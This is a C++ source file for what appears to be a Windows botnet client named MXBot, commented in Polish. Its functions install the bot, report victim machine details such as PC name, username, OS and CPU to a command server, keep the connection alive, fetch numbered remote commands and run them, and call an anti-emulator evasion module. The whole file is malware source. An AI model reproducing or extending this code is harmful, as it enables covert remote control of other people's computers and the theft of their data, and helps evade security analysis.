#include "stdafx.h"
#include "MXBot.h"
#include "Connection.h"
#include "Machine_info.h"
#include "Installation.h"
#include "Command.h"
#include "BypassKIT.h"


MXBot::MXBot()
{
}


MXBot::~MXBot()
{
}


// W³¹cza modu³ instalacyjny
void MXBot::ActivateInstallationModule()
{
	Installation Inst;
	if (!Inst.IsDestinationDirectoryActive())
		exit(1);
}


// Wyœlij payload of the day -> informacje o maszynie, wersji bota oraz jego id
void MXBot::SendPayloadOfTheDay()
{
	NewConnection Connection;
	Connection.run_winsock();
	while (!Connection.create_socket())
	{
#ifdef DMODE
		printf("Bot failed to connect, trying again in 5 seconds...\n");
#endif
		Sleep(5000);
	}
	MachineInfo Machine;
	Machine.make_info();
	Connection.send_data(Machine.create_long_payload());
	Connection.close_socket();
	WSACleanup();
#ifdef DMODE
	printf("PayloadOfTheDay sent!\n");
#endif
}


// Wysy³a wiadomoœæ typu Keep-Alive
void MXBot::SendKeepAlive()
{
	start:
	NewConnection Connection;
	Connection.run_winsock();
	if (!Connection.create_socket())
	{
		SendPayloadOfTheDay();
		goto start;
	}
	MachineInfo Machine;
	Machine.make_info();
	Connection.send_data(Machine.create_keepalive());
	Connection.close_socket();
	WSACleanup();
#ifdef DMODE
	printf("Keep-Alive sent!\n");
#endif
}


// Sprawdza obecnoœæ rozkazów na serwerze i wykonuje je, jeœli istniej¹
void MXBot::CheckCommandsAndMakeThem()
{
	start:
	NewConnection Connection;
	Connection.run_winsock();
	MachineInfo Machine;
	Machine.make_info();
	if (!Connection.create_socket())
	{
		SendKeepAlive();
		goto start;
	}
	unsigned char CommandType = Connection.check_command(Machine)[0]; //zadzia³a dla komend 0-9
	Connection.close_socket();
	WSACleanup();
	
	Command CMD(CommandType-48);
	CMD.Make();
#ifdef DMODE
	if ((int)CommandType - 48 > 0)
		printf("Command: %d :made!\n", (int)CommandType - 48);
	else
		printf("No Commands!\n");
#endif
}

#ifdef DMODE
// Wypisuje informacje o maszynie ofiary na ekran
void MXBot::WriteVictimMachineInfoToConsole()
{
	MachineInfo Machine;
	Machine.make_info();
	printf("Bot version: %s\nMachineID: %s\nPC-NAME: %s\nUsername: %s\nOS: %s\nCPU: %s\n",
		Machine.Bot_version, Machine.GetBotID().c_str(), Machine.PC_Name, Machine.Username, Machine.OS, Machine.CPU_clock);
}
#endif


void MXBot::BypassModule()
{
	BypassKIT *bkit = new BypassKIT;
	bkit->ActivateAntiEmulator();
}